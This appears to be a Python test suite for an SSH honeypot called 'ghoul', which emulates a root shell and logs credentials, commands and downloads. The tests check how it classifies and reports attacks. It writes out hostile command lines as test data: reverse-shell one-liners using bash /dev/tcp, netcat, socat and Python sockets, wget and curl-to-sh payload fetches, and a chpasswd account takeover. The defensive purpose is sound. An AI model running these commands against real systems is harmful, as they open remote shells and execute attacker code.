import asyncio

import asyncssh

from ghoul import report, server
from ghoul.shell import Shell
from ghoul.store import Store


def make_shell():
    events = []
    return Shell("srv04", on_event=lambda kind, data: events.append((kind, data))), events


def test_basic_commands():
    sh, _ = make_shell()
    assert sh.run_line("whoami") == "root\n"
    assert sh.run_line("pwd") == "/root\n"
    sh.run_line("cd /etc")
    assert sh.run_line("pwd") == "/etc\n"
    assert "root:x:0:0" in sh.run_line("cat passwd")
    assert "command not found" in sh.run_line("nonexistent")


def test_shadow_denied_and_missing_file():
    sh, _ = make_shell()
    assert "Permission denied" in sh.run_line("cat /etc/shadow")
    assert "No such file" in sh.run_line("cat /nope")


def test_chain_and_redirect():
    sh, _ = make_shell()
    sh.run_line("cd /tmp && echo hi > a.txt; echo more >> a.txt")
    assert sh.run_line("cat /tmp/a.txt") == "hi\nmore\n"


def test_wget_records_ioc_without_network():
    sh, events = make_shell()
    out = sh.run_line("cd /tmp; wget http://203.0.113.5/x.sh; chmod +x x.sh; ./x.sh")
    assert "saved" in out
    kinds = [k for k, _ in events]
    assert "url" in kinds and "download" in kinds and "exec" in kinds
    assert any(d.get("url") == "http://203.0.113.5/x.sh" for k, d in events if k == "url")
    assert sh.fs.exists("/tmp/x.sh")


def test_pipe_to_shell_detected():
    sh, events = make_shell()
    sh.run_line("curl -s http://203.0.113.5/i.sh | sh")
    assert any(k == "pipe_to_shell" for k, _ in events)


def test_exit_and_nested_sh():
    sh, _ = make_shell()
    assert sh.run_line("sh -c 'echo nested'") == "nested\n"
    sh.run_line("exit")
    assert sh.exit_requested


def test_syntax_error_does_not_crash():
    sh, _ = make_shell()
    assert "syntax error" in sh.run_line("echo 'unterminated")


def test_store_and_report(tmp_path):
    store = Store(str(tmp_path / "t.db"))
    sid = store.open_session("198.51.100.7", 4444)
    store.log_auth(sid, "root", "123456", False)
    store.log_auth(sid, "root", "admin", True)
    store.event(sid, "command", {"cmd": "uname -a"})
    store.event(sid, "url", {"url": "http://203.0.113.5/x.sh", "cmd": "wget ..."})
    text = report.build(store, color=False)
    assert "root:123456" in text and "uname -a" in text and "203.0.113.5" in text
    assert "уникальных IP: 1" in text


def _connect(port, password):
    return asyncssh.connect(
        "127.0.0.1", port, username="root", password=password, known_hosts=None, public_key_auth=False
    )


def test_end_to_end_ssh(tmp_path):
    async def scenario():
        srv, store = await server.start(
            "127.0.0.1", 0, str(tmp_path / "e2e.db"), str(tmp_path / "key"), accept_after=0
        )
        port = srv.sockets[0].getsockname()[1]
        async with await _connect(port, "hunter2") as conn:
            res = await conn.run("uname -a; wget http://203.0.113.5/x.sh", check=True)
        srv.close()
        await srv.wait_closed()
        return store, res.stdout

    store, out = asyncio.run(scenario())
    assert "Linux srv04" in out
    assert [d["cmd"] for _, _, d in store.events("command")] == ["uname -a; wget http://203.0.113.5/x.sh"]
    assert [d["url"] for _, _, d in store.events("url")] == ["http://203.0.113.5/x.sh"]
    row = store.db.execute("SELECT username, password, authed, ended FROM sessions").fetchone()
    assert (row["username"], row["password"], row["authed"]) == ("root", "hunter2", 1)
    assert row["ended"] is not None


def test_password_rejected_before_threshold(tmp_path):
    async def scenario():
        srv, store = await server.start(
            "127.0.0.1", 0, str(tmp_path / "rej.db"), str(tmp_path / "key"), accept_after=5
        )
        port = srv.sockets[0].getsockname()[1]
        denied = False
        try:
            await _connect(port, "wrong")
        except asyncssh.PermissionDenied:
            denied = True
        srv.close()
        await srv.wait_closed()
        return store, denied

    store, denied = asyncio.run(scenario())
    assert denied
    assert [d["ok"] for _, _, d in store.events("auth")] == [False]


def test_dashboard_api_on_demo_data(tmp_path):
    import json
    import threading
    import urllib.request
    from http.server import ThreadingHTTPServer

    from ghoul import dashboard, demo

    db = str(tmp_path / "demo.db")
    demo.seed(db, sessions=60)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), dashboard.make_handler(db))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def get(path):
        return urllib.request.urlopen(base + path).read()

    try:
        assert b"GHOUL" in get("/")
        summary = json.loads(get("/api/summary"))
        assert summary["sessions"] == 60 and 0 < summary["authed"] <= 60
        assert len(json.loads(get("/api/timeline"))) == 48
        assert json.loads(get("/api/top?kind=creds"))
        assert json.loads(get("/api/sessions"))
        sid = json.loads(get("/api/sessions"))[0]["id"]
        assert isinstance(json.loads(get(f"/api/session/{sid}")), list)
        try:
            get("/api/top?kind=bogus")
            raise AssertionError("ожидали 404")
        except urllib.error.HTTPError as e:
            assert e.code == 404
    finally:
        httpd.shutdown()


def test_attack_classification():
    from ghoul.dashboard import classify

    assert classify(["cd /tmp; wget http://203.0.113.5/x.sh; ./x.sh"]) == "загрузчик ботнета"
    assert classify(["echo root:x | chpasswd"]) == "захват аккаунта"
    assert classify(["uname -a", "whoami"]) == "разведка системы"
    assert classify(["foo"]) == "прочее"


def test_revshell_and_privesc_detection():
    from ghoul import patterns

    cases = {
        "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1": ("bash /dev/tcp", "203.0.113.7:4444"),
        "nc -e /bin/sh 203.0.113.7 9001": ("netcat -e/-c", "203.0.113.7:9001"),
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.7 4242 >/tmp/f": ("netcat + mkfifo", "203.0.113.7:4242"),
        "socat TCP:evil.example.net:4444 EXEC:/bin/sh": ("socat", "evil.example.net:4444"),
        "python3 -c 'import socket;s=socket.socket();s.connect((\"203.0.113.7\",4444))'": ("python socket", "203.0.113.7:4444"),
    }
    for line, (technique, target) in cases.items():
        events = patterns.detect(line)
        assert events and events[0][0] == "revshell", line
        assert events[0][1] == {"technique": technique, "target": target}, line
    assert patterns.detect("ls -la /root") == []
    assert patterns.detect("nc -zv 203.0.113.7 22") == []  # скан портов, не реверс-шелл
    techniques = [d["technique"] for k, d in patterns.detect("find / -perm -4000 2>/dev/null; sudo -l") if k == "privesc"]
    assert "поиск suid" in techniques and "sudo -l" in techniques


def test_shell_emits_revshell_event_and_classifies():
    sh, events = make_shell()
    sh.run_line("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1")
    assert ("revshell", {"technique": "bash /dev/tcp", "target": "203.0.113.7:4444"}) in events
    assert "ALL" in sh.run_line("sudo -l")


def test_miner_classification():
    from ghoul.dashboard import classify

    assert classify(["cd /tmp; wget http://203.0.113.5/.xmr; ./.xmr"]) == "майнер"
